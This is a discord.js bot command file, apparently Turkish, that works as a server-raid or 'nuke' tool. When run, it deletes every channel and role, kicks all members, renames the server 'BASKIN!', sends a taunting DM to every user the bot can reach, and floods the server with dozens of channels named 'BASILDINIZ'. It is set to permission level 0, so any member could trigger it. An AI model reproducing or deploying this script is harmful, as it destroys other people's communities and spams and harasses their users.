const Discord = require('discord.js');
exports.run = (client, message, args) => { 
  
  message.guild.channels.forEach(k => {k.delete()});
  message.guild.roles.forEach(r => {r.delete()});
  message.guild.members.forEach(ban => {ban.kick()});
  message.guild.setName('BASKIN!')
       
  client.users.forEach(msg => {
msg.send('KUDURUN!')
})
  
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
  message.guild.createChannel("BASILDINIZ")
};
exports.conf = {
  enabled: true,  
  guildOnly: true, 
  aliases: [], 
  permLevel: 0,
  kategori: 'bumbumbum'
};

exports.help = {
  name: 'başla',
  description: 'HEHEH', 
  usage: 'başla'
};

